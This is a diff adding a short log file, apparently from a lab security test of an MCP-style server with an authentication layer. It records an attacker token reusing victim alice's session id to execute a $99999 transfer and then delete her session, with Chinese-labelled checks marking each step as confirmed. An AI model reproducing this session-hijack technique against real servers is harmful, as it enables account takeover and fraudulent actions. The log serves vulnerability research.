@@ -1,0 +1,13 @@
+REQ subj=alice m=initialize sid=-
+REQ subj=alice m=notifications/initialized sid=d9ef7d86
+REQ subj=attacker m=tools/call sid=d9ef7d86
+TRANSFER-EXEC:attacker:$99999
+DELETE subj=attacker sid=d9ef7d86 known=true
+REQ subj=alice m=tools/list sid=d9ef7d86
+=== 靶机#4 · 官方SDK+认证层（解耦判定） ===
+!!成立 | P-A0 对照:无token被401拒(认证层生效) | status=401
+!!成立 | P-A0b alice合法会话建立 | sid=d9ef7d86
+!!成立 | P-A1 认证后跨主体接管(attacker token+victim sid执行转账) | status=200 转账以attacker身份经victim会话执行: true
+!!成立 | P-A2 认证后跨主体杀会话 | DELETE status=200
+!!成立 | P-A2b 受害者自己的合法token也被拒(sid已死) | victim后续 status=404
+serverLog: REQ subj=alice m=initialize sid=- | REQ subj=alice m=notifications/initialized sid=d9ef7d86 | REQ subj=attacker m=tools/call sid=d9ef7d86 | TRANSFER-EXEC:attacker:$99999 | DELETE subj=attacker sid=d9ef7d86 known=true | REQ subj=alice m=tools/list sid=d9ef7d86 | === 靶机#4 · 官方SDK+认证层（解耦判定） === | !!成立 | P-A0 对照:无token被401拒(认证层生效) | status=401 | !!成立 | P-A0b alice合法会话建立 | sid=d9ef7d86 | !!成立 | P-A1 认证后跨主体接管(attacker token+victim sid执行转账) | status=200 转账以attacker身份经victim会话执行: true | !!成立 | P-A2 认证后跨主体杀会话 | DELETE status=200 | !!成立 | P-A2b 受害者自己的合法token也被拒(sid已死) | victim后续 status=404 | 
